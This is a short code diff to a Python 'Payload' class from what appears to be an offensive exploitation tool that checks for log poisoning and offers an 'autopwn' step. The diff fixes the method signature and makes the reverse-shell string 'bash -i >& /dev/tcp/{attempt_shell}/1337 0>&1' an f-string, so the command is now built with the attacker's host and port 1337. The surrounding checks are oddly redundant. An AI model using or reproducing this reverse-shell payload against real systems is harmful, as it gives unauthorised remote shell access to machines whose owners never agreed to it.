@@ -61,12 +61,12 @@ class Payload:
 			logres = self.logPoisonCheck()
 
 		if attempt_shell:
-			autopwn(attempt_shell, cookieres, headerres, logres)
+			self.autopwn(attempt_shell, cookieres, headerres, logres)
 
 
 
-	def autopwn(attempt_shell, cookieres, headerres, logres):
-		payload = "bash -i >& /dev/tcp/{attempt_shell}/1337 0>&1"
+	def autopwn(self, attempt_shell, cookieres, headerres, logres):
+		payload = f"bash -i >& /dev/tcp/{attempt_shell}/1337 0>&1"
 		if headerres and cookieres and logres == False:
 			if cookieres and headerres and logres == False:
 				print(colored("[-] No RCE Found. Autopwn impossible...", "red"))
